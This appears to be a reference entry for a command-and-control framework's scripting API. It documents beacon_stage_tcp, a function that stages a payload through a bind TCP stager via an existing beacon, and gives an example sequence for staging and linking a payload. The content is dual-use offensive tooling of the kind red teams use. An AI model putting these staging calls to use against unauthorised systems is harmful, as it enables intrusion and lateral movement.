beacon_stage_tcp

This function handles the staging process for a bind TCP stager. This is the preferred stager for localhost-only staging. You can stage any payload/listener through this stager. Use &stager_bind_tcp to generate this stager.

#### Arguments

`$1` - the id of the beacon to stage through

`$2` - reserved; use $null for now.

`$3` - the port to stage to

`$4` - the listener name

`$5` - the architecture of the payload to stage (x86, x64)

#### Example

```
# step 1. generate our stager
$stager = stager_bind_tcp("my-listener", "x86", 1234);

# step 2. do something to run our stager

# step 3. stage a payload via this stager
beacon_stage_tcp($bid, $target, 1234, "my-listener", "x86");

# step 4. assume control of the payload (if needed)
beacon_link($bid, $target, "my-listener");```

